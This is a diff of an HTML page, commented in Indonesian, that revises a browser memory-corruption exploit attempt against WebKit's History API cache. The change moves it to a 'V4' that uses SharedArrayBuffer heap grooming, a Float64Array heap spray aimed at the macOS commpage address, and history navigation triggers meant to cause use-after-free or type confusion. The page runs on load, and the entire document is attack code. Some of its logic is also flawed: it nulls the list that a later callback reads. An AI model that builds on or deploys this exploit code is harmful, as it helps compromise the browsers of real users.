@@ -1,28 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>History API State Corruption V3 (Sinkronisasi Maksimal)</title>
+    <title>History API State Corruption V4 (SAB Heap Grooming)</title>
 </head>
 <body>
 
-    <h1>History API State Corruption V3 (FREE/SPRAY Sinkron)</h1>
+    <h1>History API State Corruption V4 (SAB Heap Grooming)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan Serangan History API V3...</p>
+    <p id="status">INIT: Mempersiapkan SAB Heap Grooming...</p>
     <div id="log-area"></div>
 
     <script>
         // --- KONSTANTA COMM PAGE ---
         const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
         const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
-        const TARGET_LENGTH_VALUE = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); // LOW WORD
-        const TARGET_CONTROL_ADDRESS_64 = TARGET_CONTROL_ADDRESS; 
+        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
         
-        const LOW_WORD = TARGET_LENGTH_VALUE;
+        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
         const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
 
         let startTime = performance.now();
         let payloadHolders = []; 
-        let historyStates = []; // Menyimpan referensi state
+        let sabList = []; // Daftar SAB untuk grooming
 
         function log(message, type = 'log-info') {
             const timeElapsed = (performance.now() - startTime).toFixed(2);
@@ -31,19 +30,17 @@
             logElement.scrollTop = logElement.scrollHeight;
         }
 
-        // --- FUNGSI HEAP SPRAY PAYLOAD (Mengandung Alamat Commpage 64-bit) ---
+        // --- FUNGSI HEAP SPRAY PAYLOAD (Menggunakan Float64Array) ---
         function sprayPayload() {
-            log("Memulai Spraying Payload SINKRON...", "log-spray");
-            // Menggunakan Float64Array untuk menargetkan pointer 64-bit
-            const SPRAY_COUNT = 2000; 
+            log("Memulai Spraying Payload SINKRON (Float64Array)...", "log-spray");
+            const SPRAY_COUNT = 3000; 
             const PAYLOAD_SIZE = 64; 
 
             for (let i = 0; i < SPRAY_COUNT; i++) {
                 let payloadArray = new Float64Array(PAYLOAD_SIZE);
-                // Menempatkan alamat 64-bit di lokasi header pointer
                 payloadArray[0] = HIGH_WORD; 
                 payloadArray[1] = LOW_WORD;
-                payloadArray[2] = 2032.0 + i; 
+                payloadArray[2] = 2033.0 + i; 
                 payloadHolders.push(payloadArray); 
             }
         }
@@ -51,55 +48,81 @@
         // --- FUNGSI UTAMA ATTACK ---
         function runHistoryAttack() {
             startTime = performance.now();
-            log("Phase 1: History Grooming (100 States).", "log-init");
+            log("Phase 1: History Grooming dengan SharedArrayBuffer.", "log-init");
 
             const HISTORY_COUNT = 100;
-            const STATE_ARRAY_SIZE = 1024 * 5; 
+            const SAB_SIZE = 4096; // 4KB (Ukuran yang sering digunakan oleh slab allocator)
             
-            // 1. Fragmentasi Heap dengan History State
+            // 1. Grooming Heap dengan SAB dan pushState
             for (let i = 0; i < HISTORY_COUNT; i++) {
-                let stateArray = new Uint32Array(STATE_ARRAY_SIZE);
-                window.history.pushState({ id: i, data: stateArray }, `State ${i}`, `#step${i}`);
-                historyStates.push(stateArray);
+                let sab = new SharedArrayBuffer(SAB_SIZE);
+                let sabView = new Uint32Array(sab);
+                sabView[0] = 0xDEADBEEF + i; // Nilai penanda
+                
+                // Gunakan pushState. Ini menyimpan pointer/header SAB di History Cache C++
+                window.history.pushState({ id: i, data: sab }, `SAB State ${i}`, `#step${i}`);
+                sabList.push(sab); // Simpan referensi SAB
             }
-            log("Phase 2: Semua State diserialisasi.", "log-info");
+            log(`Phase 2: ${HISTORY_COUNT} SAB diserialisasi dan disimpan.`, "log-info");
             
-            // --- KONDISI KRITIS: FREE SINKRON ---
-            
-            // Memicu Navigasi yang me-free state lama
-            window.history.go(-HISTORY_COUNT);
-            log("Phase 3: Navigasi ke state paling awal (FREE mulai).", "log-critical");
+            // 2. Navigasi Cepat (FREE C++)
+            window.history.go(-HISTORY_COUNT); 
+            log("Phase 3: Navigasi ke state paling awal (FREE SAB Cache C++).", "log-critical");
 
-            // Tepat di tengah proses Navigasi/FREE, lakukan SPRAY SINKRON
-            // Kode ini dieksekusi secepat mungkin oleh JS Engine.
+            // 3. SPRAY SINKRON
+            // Kode ini dieksekusi tepat saat History Cache C++ me-free alokasi SAB-nya.
             sprayPayload(); 
-            log("Phase 4: SPRAY Commpage Payload SINKRON.", "log-critical");
+            log("Phase 4: SPRAY Commpage Payload SINKRON (Menimpa SAB Header).", "log-critical");
 
-            // Hapus referensi JS setelah spray (memastikan GC melihatnya kosong)
-            historyStates = null;
-            
-            // --- TRIGGER SINKRON ---
-            
-            // Coba ganti state lagi. Ini memaksa WebKit untuk memproses History API Cache 
-            // saat memori mungkin sudah ditimpa.
-            window.history.replaceState({ trigger: true }, 'Attack Trigger', '#final');
+            // 4. Trigger Implisit (Memaksa Pembacaan Cache Corrupt)
+            // Trigger 1: Replace State (Menulis ke lokasi yang baru di-spray)
+            let triggerSAB = new SharedArrayBuffer(SAB_SIZE);
+            window.history.replaceState({ trigger: triggerSAB }, 'Attack Trigger', '#final');
             log("Phase 5: ReplaceState Trigger Aktif.", "log-critical");
             
-            // Trigger Implisit (untuk memicu GC dan Dereference C++)
+            // Trigger 2: Membaca data dari SAB yang seharusnya sudah di-free/corrupt
             setTimeout(() => {
-                log("Phase 6: Memicu Navigasi Balik untuk Dereference.", "log-critical");
+                log("Phase 6: Memicu Access ke SAB yang Corrupt...", "log-critical");
                 
-                // Kembali ke state yang baru dibuat (yang mungkin corrupt)
-                window.history.go(-1); 
-                
-                log("Menunggu Crash Implisit (EXC_BAD_ACCESS)...", "log-info");
+                // Akses array yang *kita simpan*, yang harusnya sekarang menunjuk ke Header SAB yang ditimpa
+                const victimSAB = sabList[sabList.length - 1]; // Ambil salah satu SAB dari list
+                if (victimSAB) {
+                    try {
+                        let victimView = new Float64Array(victimSAB); 
+                        
+                        // Baca alamat yang seharusnya ditimpa oleh Payload Commpage (HIGH_WORD / LOW_WORD)
+                        const readHigh = victimView[0];
+                        const readLow = victimView[1];
+                        
+                        log(`Nilai dibaca (High): 0x${readHigh.toString(16)}`, "log-critical");
+                        log(`Nilai dibaca (Low): 0x${readLow.toString(16)}`, "log-critical");
+
+                        if (Math.floor(readHigh) === HIGH_WORD) {
+                            log("SUCCESS: Type Confusion / SAB Header Corrupt oleh Commpage!", "log-success");
+                        }
+                        
+                        // Final Trigger: Coba alokasi besar dengan nilai yang dibaca
+                        let finalArray = new Array(Math.floor(readLow) & 0xFFFF);
+                        finalArray.fill(0);
+
+                    } catch(e) {
+                        log(`JS Exception saat Trigger: ${e.message} - Menunggu Crash OS.`, "log-critical");
+                    }
+                }
             }, 100);
+            
+            // Hapus referensi untuk membantu GC membersihkan SAB
+            sabList = null;
         }
         
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian History API V3...';
+             if (!window.SharedArrayBuffer) {
+                 document.getElementById('status').textContent = 'Gagal: SharedArrayBuffer tidak didukung.';
+                 return;
+             }
+            document.getElementById('status').textContent = 'Memulai rangkaian History API V4...';
             setTimeout(runHistoryAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah FREE/SPRAY Sinkron di History Cache.';
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah SAB Heap Grooming.';
         });
     </script>
     <style>
